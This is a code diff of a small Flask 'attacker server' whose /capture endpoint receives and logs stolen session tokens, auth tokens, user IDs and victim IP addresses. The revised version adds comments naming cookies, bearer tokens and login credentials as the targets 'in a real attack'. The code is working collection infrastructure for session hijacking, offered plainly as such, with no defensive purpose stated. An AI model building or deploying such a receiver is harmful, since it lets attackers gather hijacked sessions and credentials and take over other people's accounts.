@@ -1,29 +1,30 @@
-import os
 from flask import Flask, request, jsonify
 import datetime
 
 app = Flask(__name__)
 
 @app.route('/capture', methods=['POST'])
-def capture():
+def capture_session():
     data = request.json
-    token = data.get('session_token')
-    user = data.get('user_id')
     
-    print("\n" + "="*40)
-    print("[!!!] HIJACK ALERT: DATA RECEIVED [!!!]")
-    print(f"TIME: {datetime.datetime.now()}")
-    print(f"TARGET: {user}")
-    print(f"STOLEN TOKEN: {token}")
-    print("="*40 + "\n")
+    # In a real attack, we are looking for:
+    # 1. The Session ID (Cookie)
+    # 2. The Auth Token (Bearer Token)
+    # 3. The User's Login Credentials
     
-    return jsonify({"status": "success"}), 200
+    auth_token = data.get('auth_token')
+    user_id = data.get('user_id')
+    ip_address = request.remote_addr
 
-@app.route('/')
-def home():
-    return "Attacker Server is Online."
+    print("\n" + "!"*40)
+    print(f"[*] CRITICAL: SESSION DATA INTERCEPTED")
+    print(f"[*] TIMESTAMP: {datetime.datetime.now()}")
+    print(f"[*] TARGET USER: {user_id}")
+    print(f"[*] IP ADDRESS: {ip_address}")
+    print(f"[*] AUTH TOKEN: {auth_token}")
+    print("!"*40 + "\n")
+
+    return jsonify({"status": "intercepted"}), 200
 
 if __name__ == '__main__':
-    # Render assigns a port via environment variables
-    port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=8080)
